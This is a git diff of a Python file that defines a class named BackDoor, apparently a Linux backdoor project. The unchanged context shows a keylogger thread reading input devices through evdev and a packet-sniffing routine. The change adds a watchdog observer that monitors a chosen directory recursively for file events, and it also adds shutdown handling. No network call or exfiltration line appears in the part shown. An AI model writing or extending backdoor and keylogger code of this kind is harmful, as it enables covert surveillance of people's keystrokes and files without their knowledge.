@@ -12,6 +12,10 @@ import asyncio
 from evdev import InputDevice, ecodes, categorize
 import time
 from threading import Thread
+from watch import EventHandler
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+
 
 key_code_map = {
     0: '',
@@ -145,11 +149,21 @@ class BackDoor:
         try:
             keylog_t = Thread(target=self.start_keylogger)
             keylog_t.start()
+
+            event_handler = EventHandler(self.watch_file)
+            observer = Observer()
+            observer.schedule(event_handler, self.watch_dir, recursive=True)
+            observer.start()
+
             print("Keylogger started")
             print("Listening for packets")
             print("--------------------------------------------------------------")
             self.sniff_init()
         except KeyboardInterrupt as e:
+            observer.stop()
+            observer.join()
+            sys.exit(" Closed")
+        except FileNotFoundError as e:
             sys.exit(" Closed")
 
 
